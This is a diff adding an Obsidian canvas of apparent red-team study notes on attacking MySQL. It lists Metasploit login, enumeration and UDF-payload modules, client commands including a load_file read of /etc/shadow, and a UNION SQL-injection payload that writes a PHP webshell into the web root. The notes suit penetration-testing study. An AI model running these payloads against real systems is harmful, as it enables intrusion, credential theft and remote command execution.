@@ -1,0 +1,22 @@
+{
+	"nodes":[
+		{"id":"28baeb20b3316449","type":"text","text":"# MySQL (T:3306)","x":-342,"y":-4,"width":400,"height":80},
+		{"id":"d6c31c53d3139b0a","type":"text","text":"# $ msf - mysql_login","x":35,"y":240,"width":404,"height":85},
+		{"id":"1b88edaffc642172","type":"text","text":"# $ msf - mysql_enum","x":500,"y":167,"width":390,"height":60},
+		{"id":"b543083825971e2e","type":"text","text":"# $ msf -mysql_udf_payload\n```bash\nmsf> use exploit/multi/mysql/mysql_udf_payload \nmsf> set FORCE_UDF_UPLOAD true\n```","x":500,"y":283,"width":529,"height":173},
+		{"id":"f9bc93a602991c09","type":"text","text":"# $ mysql\n```bash\n$ mysql -h <IP> -u <user> -p <passwd> [-P <port>]\n\nMySQL [(none)]> select version();\nMySQL [(none)]> select system_user();\n\nMySQL [(none)]> show databases;\nMySQL [(none)]> use <db_name>;\nMySQL [(none)]> show tables;\nMySQL [(none)]> select * from <authors>; # show everything from table \"authors\"\nMySQL [(none)]> select count(*) from <authors>;# count lines in table\nMySQL [(none)]> select load_file(\"/etc/shadow\");# show file content\n```","x":237,"y":-773,"width":865,"height":360},
+		{"id":"3c58f2fd5f007718","type":"text","text":"# Code Execution\nAlthough the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the [_SELECT INTO_OUTFILE_](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statement to write files on the web server.\n\n**For this attack to work, the file location must be writable to the OS user running the database software.**\n\nAs an example, let's resume the UNION payload on our MySQL target application we explored previously, expanding the query that writes a webshell on disk.\n\nWe'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.\n```bash\n# example\n' UNION SELECT \"<?php system($_GET['cmd']);?>\", null, null, null, null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //\n```","x":800,"y":-391,"width":1089,"height":451},
+		{"id":"d474895ccda7c457","type":"file","file":"NOTES/0. Redteam/WebAPP/sqlmap.md","x":-342,"y":-680,"width":400,"height":400},
+		{"id":"deff0627d0d7b613","type":"link","url":"https://portswigger.net/web-security/sql-injection/cheat-sheet","x":-280,"y":456,"width":1000,"height":884},
+		{"id":"2a98e644692c88ca","type":"file","file":"NOTES/0. Redteam/2. Services/images/Pasted image 20250318141553.png","x":1420,"y":-1039,"width":780,"height":532}
+	],
+	"edges":[
+		{"id":"bd92dfec381b4b6f","fromNode":"d6c31c53d3139b0a","fromSide":"right","toNode":"1b88edaffc642172","toSide":"left"},
+		{"id":"ac81b7ebf1c30cba","fromNode":"d6c31c53d3139b0a","fromSide":"right","toNode":"b543083825971e2e","toSide":"left"},
+		{"id":"c45517bb95fb74b6","fromNode":"28baeb20b3316449","fromSide":"right","toNode":"d6c31c53d3139b0a","toSide":"left","label":"$ msf"},
+		{"id":"3ef28002051f2178","fromNode":"28baeb20b3316449","fromSide":"right","toNode":"f9bc93a602991c09","toSide":"left","label":"$ mysql"},
+		{"id":"b1347e9f89dc5ae0","fromNode":"f9bc93a602991c09","fromSide":"bottom","toNode":"3c58f2fd5f007718","toSide":"left"},
+		{"id":"c863ef33bdd10d86","fromNode":"28baeb20b3316449","fromSide":"top","toNode":"d474895ccda7c457","toSide":"bottom"},
+		{"id":"b6c0c722fb8364a4","fromNode":"f9bc93a602991c09","fromSide":"right","toNode":"2a98e644692c88ca","toSide":"left","label":"SSL error"}
+	]
+}
